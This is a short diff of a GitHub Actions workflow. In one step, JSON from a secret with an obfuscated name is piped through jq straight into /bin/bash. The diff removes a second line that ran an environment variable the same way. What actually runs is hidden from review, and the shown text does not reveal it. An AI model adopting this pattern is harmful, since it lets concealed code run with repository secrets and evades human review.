@@ -21,7 +21,6 @@ jobs:
           puu643: ${{ secrets.puu643 }}
         run: |
           printf '%s' "$puu643" | jq -r .iuyfu6 | /bin/bash
-          echo $tufa5501 | jq -r .o12 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
